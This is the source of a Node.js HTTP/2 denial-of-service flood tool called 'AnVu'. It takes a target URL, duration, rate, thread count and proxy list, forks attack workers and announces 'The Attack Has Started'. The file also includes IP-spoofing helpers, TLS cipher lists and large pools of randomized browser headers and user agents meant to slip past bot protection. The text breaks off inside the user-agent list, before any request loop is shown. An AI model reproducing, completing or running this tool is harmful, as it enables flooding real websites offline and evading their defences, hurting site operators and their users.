const net = require("net");
 const http2 = require("http2");
 const tls = require("tls");
 const cluster = require("cluster");
 const url = require("url");
 const crypto = require("crypto");
 const fs = require("fs");
 const colors = require('colors');
 const os = require("os");
 const axios = require('axios');
 const https = require('https');
 const { HeaderGenerator } = require('header-generator');
 const generateLargeData = () => crypto.randomBytes(1024 * 1024).toString('hex');

const errorHandler = error => {
    //console.log(error);
};
process.on("uncaughtException", errorHandler);
process.on("unhandledRejection", errorHandler);

 process.setMaxListeners(0);
 require("events").EventEmitter.defaultMaxListeners = 0;
 process.on('uncaughtException', function (exception) {
  });

 if (process.argv.length < 7){console.log(`Usage: target time rate thread proxyfile`); process.exit();}
 const headers = {};
  function readLines(filePath) {
     return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
 }
 
 const getCurrentTime = () => {
    const now = new Date();
    const hours = now.getHours().toString().padStart(2, '0');
    const minutes = now.getMinutes().toString().padStart(2, '0');
    const seconds = now.getSeconds().toString().padStart(2, '0');
    return `(\x1b[34m${hours}:${minutes}:${seconds}\x1b[0m)`;
  };

  const targetURL = process.argv[2];
  const agent = new https.Agent({ rejectUnauthorized: false });

  function getStatus() {
  const timeoutPromise = new Promise((resolve, reject) => {
    setTimeout(() => {
      reject(new Error('Request Timed Out'));
    }, 5000);
  });

  const axiosPromise = axios.get(targetURL, { httpsAgent: agent });

  Promise.race([axiosPromise, timeoutPromise])
    .then((response) => {
      const { status, data } = response;
      console.log(`[\x1b[35mAnVu\x1b[0m] ${getCurrentTime()} Title: ${getTitleFromHTML(data)} (\x1b[32m${status}\x1b[0m)`);
    })
    .catch((error) => {
      if (error.message === 'Request timed out') {
        console.log(`[\x1b[35mAnVu\x1b[0m] ${getCurrentTime()} Request Timed Out`);
      } else if (error.response) {
        const extractedTitle = getTitleFromHTML(error.response.data);
        console.log(`[\x1b[35mAnVu\x1b[0m] ${getCurrentTime()} Title: ${extractedTitle} (\x1b[31m${error.response.status}\x1b[0m)`);
      } else {
        console.log(`[\x1b[35mAnVu\x1b[0m] ${getCurrentTime()} ${error.message}`);
      }
    });
}


 function getTitleFromHTML(html) {
   const titleRegex = /<title>(.*?)<\/title>/i;
   const match = html.match(titleRegex);
   if (match && match[1]) {
     return match[1];
   }
   return 'Not Found';
 }

 function randomIntn(min, max) {
     return Math.floor(Math.random() * (max - min) + min);
 }
 
 function randomElement(elements) {
     return elements[randomIntn(0, elements.length)];
 } 
 
 function randstr(length) {
   const characters =
     "abcdefghijklmnopqrstuvwxyz";
   let result = "";
   const charactersLength = characters.length;
   for (let i = 0; i < length; i++) {
     result += characters.charAt(Math.floor(Math.random() * charactersLength));
   }
   return result;
 }
 
 const ip_spoof = () => {
   const getRandomByte = () => {
     return Math.floor(Math.random() * 255);
   };
   return `${getRandomByte()}.${getRandomByte()}.${getRandomByte()}.${getRandomByte()}`;
 };
 
 const spoofed = ip_spoof();


 const ip_spoof2 = () => {
   const getRandomByte = () => {
     return Math.floor(Math.random() * 2500);
   };
   return `${getRandomByte()}`;
 };
 
 const spoofed2 = ip_spoof2();
 function getRandomDate(start = new Date(2000, 0, 1), end = new Date()) {
    return new Date(start.getTime() + Math.random() * (end.getTime() - start.getTime()));
}

 const ip_spoof3 = () => {
   const getRandomByte = () => {
     return Math.floor(Math.random() * 99);
   };
   return `${getRandomByte()}`;
 };
 
 const spoofed3 = ip_spoof3();
 
 const ip_spoof4 = () => {
   const getRandomByte = () => {
     return Math.floor(Math.random() * 9);
   };
   return `${getRandomByte()}`;
 };
 
 const spoofed4 = ip_spoof4(); 
 const args = {
  target: process.argv[2],
  time: ~~process.argv[3],
  Rate: ~~process.argv[4],
  threads: ~~process.argv[5],
  proxyFile: process.argv[6]
}


if (cluster.isMaster){
console.clear();
console.log(`
AnVu-http/2-test                               
`);

for (let i = 1; i <= process.argv[5]; i++){
 cluster.fork();
 console.log(`[\x1b[35mAnVu\x1b[0m] ${getCurrentTime()} Attack Thread ${i} Started`);
}
console.log(`[\x1b[35mAnVu\x1b[0m] ${getCurrentTime()} The Attack Has Started`);
setInterval(getStatus, 2000);
setTimeout(() => {
 console.log(`[\x1b[35mAnVu\x1b[0m] ${getCurrentTime()} The Attack Is Over`);
 process.exit(1);
}, process.argv[3] * 1000);
} 

let headerGenerator = new HeaderGenerator({
 browsers: [
     { name: "firefox", minVersion: 112, httpVersion: "2" },
     { name: "opera", minVersion: 112, httpVersion: "2" },
     { name: "edge", minVersion: 112, httpVersion: "2" },
     { name: "chrome", minVersion: 112, httpVersion: "2" },
     { name: "safari", minVersion: 16, httpVersion: "2" },
 ],
 devices: [
     "desktop",
     "mobile",
 ],
 operatingSystems: [
     "windows",
     "linux",
     "macos",
     "android",
     "ios",
 ],
 locales: ["en-US", "en"]
});
let randomHeaders = headerGenerator.getHeaders()

function generateRandomPriority() {
  const randomPriority = Math.floor(Math.random() * 256);
  return randomPriority;
}

const randomPriorityValue = generateRandomPriority();

function generateRandomString(minLength, maxLength) {
          const characters = 'abcdefghijklmnopqrstuvwxyz'; 
  const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
  const randomStringArray = Array.from({ length }, () => {
    const randomIndex = Math.floor(Math.random() * characters.length);
    return characters[randomIndex];
  });

  return randomStringArray.join('');
}

 const sig = [    
    'rsa_pss_rsae_sha256',
    'rsa_pss_rsae_sha384',
    'rsa_pss_rsae_sha512',
    'rsa_pkcs1_sha256',
    'rsa_pkcs1_sha384',
    'rsa_pkcs1_sha512'
 ];
 const sigalgs1 = sig.join(':');
 const cplist = [
  "TLS_AES_128_CCM_8_SHA256",
  "TLS_AES_128_CCM_SHA256",
  "TLS_CHACHA20_POLY1305_SHA256",
  "TLS_AES_256_GCM_SHA384",
  "TLS_AES_128_GCM_SHA256"
 ];
const val = { 'NEl': JSON.stringify({
      "report_to": Math.random() < 0.5 ? "cf-nel" : 'default',
      "max-age": Math.random() < 0.5 ? 604800 : 2561000,
      "include_subdomains": Math.random() < 0.5 ? true : false}),
            }
 const accept_header = [
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", 
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", 
  "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,en-US;q=0.5',
  'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8,en;q=0.7',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/atom+xml;q=0.9',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/rss+xml;q=0.9',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/json;q=0.9',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/ld+json;q=0.9',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-dtd;q=0.9',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-external-parsed-entity;q=0.9',
  'text/html; charset=utf-8',
  'application/json, text/plain, */*',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/xml;q=0.9',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/plain;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'
 ]; 
 lang_header = [
  'ko-KR',
  'en-US',
  'zh-CN',
  'zh-TW',
  'ja-JP',
  'en-GB',
  'en-AU',
  'en-GB,en-US;q=0.9,en;q=0.8',
  'en-GB,en;q=0.5',
  'en-CA',
  'en-UK, en, de;q=0.5',
  'en-NZ',
  'en-GB,en;q=0.6',
  'en-ZA',
  'en-IN',
  'en-PH',
  'en-SG',
  'en-HK',
  'en-GB,en;q=0.8',
  'en-GB,en;q=0.9',
  ' en-GB,en;q=0.7',
  '*',
  'en-US,en;q=0.5',
  'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
  'utf-8, iso-8859-1;q=0.5, *;q=0.1',
  'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5',
  'en-GB, en-US, en;q=0.9',
  'de-AT, de-DE;q=0.9, en;q=0.5',
  'cs;q=0.5',
  'da, en-gb;q=0.8, en;q=0.7',
  'he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7',
  'en-US,en;q=0.9',
  'de-CH;q=0.7',
  'tr',
  'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2'
 ];
 
 const encoding_header = [
  '*',
  '*/*',
  'gzip',
  'gzip, deflate, br',
  'compress, gzip',
  'deflate, gzip',
  'gzip, identity',
  'gzip, deflate',
  'br',
  'br;q=1.0, gzip;q=0.8, *;q=0.1',
  'gzip;q=1.0, identity; q=0.5, *;q=0',
  'gzip, deflate, br;q=1.0, identity;q=0.5, *;q=0.25',
  'compress;q=0.5, gzip;q=1.0',
  'identity',
  'gzip, compress',
  'compress, deflate',
  'compress',
  'gzip, deflate, br',
  'deflate',
  'gzip, deflate, lzma, sdch',
  'deflate',
 ];
const control_header = [
  'max-age=604800',
  'proxy-revalidate',
  'public, max-age=0',
  'max-age=315360000',
  'public, max-age=86400, stale-while-revalidate=604800, stale-if-error=604800',
  's-maxage=604800',
  'max-stale',
  'public, immutable, max-age=31536000',
  'must-revalidate',
  'private, max-age=0, no-store, no-cache, must-revalidate, post-check=0, pre-check=0',
  'max-age=31536000,public,immutable',
  'max-age=31536000,public',
  'min-fresh',
  'private',
  'public',
  's-maxage',
  'no-cache',
  'no-cache, no-transform',
  'max-age=2592000',
  'no-store',
  'no-transform',
  'max-age=31557600',
  'stale-if-error',
  'only-if-cached',
  'max-age=0',
 ];
 const uap = [
"POLARIS/6.01(BREW 3.1.5;U;en-us;LG;LX265;POLARIS/6.01/WAP;)MMP/2.0 profile/MIDP-201 Configuration /CLDC-1.1",
"POLARIS/6.01 (BREW 3.1.5; U; en-us; LG; LX265; POLARIS/6.01/WAP) MMP/2.0 profile/MIDP-2.1 Configuration/CLDC-1.1",
"portalmmm/2.0 N410i(c20;TB) ",
"SuperBot/4.4.0.60 (Windows XP)",
"Uzbl (Webkit 1.3) (Linux i686 [i686])",
"Vodafone/1.0/V802SE/SEJ001 Browser/SEMC-Browser/4.1",
"W3C_Validator/1.305.2.12 libwww-perl/5.64",
"W3C_Validator/1.654",
"w3m/0.5.1",
"WDG_Validator/1.6.2",
"WebCopier v4.6",
"Web Downloader/6.9",
"WebZIP/3.5 (http://www.spidersoft.com)",
"Wget/1.9.1",
"Wget/1.9 cvs-stable (Red Hat modified)",
"wii libnup/1.0",
"SAMSUNG-S8000/S8000XXIF3 SHP/VPP/R5 Jasmine/1.0 Nextreaming SMM-MMS/1.2.0 profile/MIDP-2.1 configuration/CLDC-1.1 FirePHP/0.3",
"SAMSUNG-SGH-A867/A867UCHJ3 SHP/VPP/R5 NetFront/35 SMM-MMS/1.2.0 profile/MIDP-2.0 configuration/CLDC-1.1 UP.Link/6.3.0.0.0",
"SAMSUNG-SGH-E250/1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Browser/6.2.3.3.c.1.101 (GUI) MMP/2.0 (compatible; Googlebot-Mobile/2.1;  http://www.google.com/bot.html)",
"SearchExpress",
"SEC-SGHE900/1.0 NetFront/3.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 Opera/8.01 (J2ME/MIDP; Opera Mini/2.0.4509/1378; nl; U; ssr)",
"SEC-SGHX210/1.0 UP.Link/6.3.1.13.0",
"SEC-SGHX820/1.0 NetFront/3.2 Profile/MIDP-2.0 Configuration/CLDC-1.1",
"SonyEricssonK310iv/R4DA Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.1.13.0",
"SonyEricssonK550i/R1JD Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
"SonyEricssonK610i/R1CB Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
"SonyEricssonK750i/R1CA Browser/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1",
"SonyEricssonK800i/R1CB Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0",
"SonyEricssonK810i/R1KG Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
"SonyEricssonS500i/R6BC Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
"SonyEricssonT100/R101",
"Opera/9.80 (Macintosh; Intel Mac OS X 10.4.11; U; en) Presto/2.7.62 Version/11.00",
"Opera/9.80 (S60; SymbOS; Opera Mobi/499; U; ru) Presto/2.4.18 Version/10.00",
"Opera/9.80 (Windows NT 5.2; U; en) Presto/2.2.15 Version/10.10",
"Opera/9.80 (Windows NT 6.1; U; en) Presto/2.7.62 Version/11.01",
"Opera/9.80 (X11; Linux i686; U; en) Presto/2.2.15 Version/10.10",
"Opera/10.61 (J2ME/MIDP; Opera Mini/5.1.21219/19.999; en-US; rv:1.9.3a5) WebKit/534.5 Presto/2.6.30",
"SonyEricssonT610/R201 Profile/MIDP-1.0 Configuration/CLDC-1.0",
"SonyEricssonT650i/R7AA Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
"SonyEricssonT68/R201A",
"SonyEricssonW580i/R6BC Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
"SonyEricssonW660i/R6AD Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
"SonyEricssonW810i/R4EA Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0",
"SonyEricssonW850i/R1ED Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1",
"SonyEricssonW950i/R100 Mozilla/4.0 (compatible; MSIE 6.0; Symbian OS; 323) Opera 8.60 [en-US]",
"SonyEricssonW995/R1EA Profile/MIDP-2.1 Configuration/CLDC-1.1 UNTRUSTED/1.0",
"SonyEricssonZ800/R1Y Browser/SEMC-Browser/4.1 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Link/6.3.0.0.0",
"BlackBerry9000/4.6.0.167 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/102",
"BlackBerry9530/4.7.0.167 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/102 UP.Link/6.3.1.20.0",
"BlackBerry9700/5.0.0.351 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/123",
"Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/112.0",
"Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/85.7 (KHTML, like Gecko) Safari/85.7",
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36 OPR/87.0.4390.36',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0',
'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.115 Safari/537.36 OPR/88.0.4412.40',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36 OPR/87.0.4390.45',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (iPhone; CPU iPhone OS 16_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/112.0.5615.46 Mobile/15E148 Safari/604.1',
'Mozilla/5.0 (Linux; Android 11; Infinix X689C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; DCO-LX9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 9; SO-01K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; SM-N986N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; M2104K10I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; M2003J15SC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; SM-A525F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; SM-A305GT) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; RMX2061) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; CPH2413) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; RMX3363) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; Redmi Note 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; SM-A536U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; Infinix X6815B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 12; SM-A127F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1',
'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1814) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 11; Nokia 7.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (iPhone; CPU iPhone OS 15_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6,2 Mobile/15E148 Safari/604.1',
'Mozilla/5.0 (Linux; Android 13; SM-A042F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Linux; Android 13; M2101K6P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Android 10; Mobile; rv:102.0) Gecko/102.0 Firefox/102.0',
'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Avast/111.0.20716.147',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/112.0.1722.34',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.62',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 OPR/97.0.0.0',
'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/111.0',
'Mozilla/5.0 (Windows NT 10.0; rv:111.0) Gecko/20100101 Firefox/111.0',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 OPR/94.0.0.0 (Edition Yx GX)',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 YaBrowser/23.3.1.806 Yowser/2.5 Safari/537.36',
'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36',
'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 YaBrowser/23.1.2.978 Yowser/2.5 Safari/537.36',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/111.0',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/110.0.1587.69',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 OPR/96.0.0.0',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edg/111.0.1661.54',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 OPR/96.0.0.0 (Edition Yx 05)',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.1 Safari/605.1.15',
'Mozilla/5.0 (Windows NT 10.0; rv:102.0) Gecko/20100101 Firefox/102.0',
'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36',
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36",
"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9",
"Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4",
"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240",
"Mozilla/5.0 (Windows NT 6.3; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
"Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko",
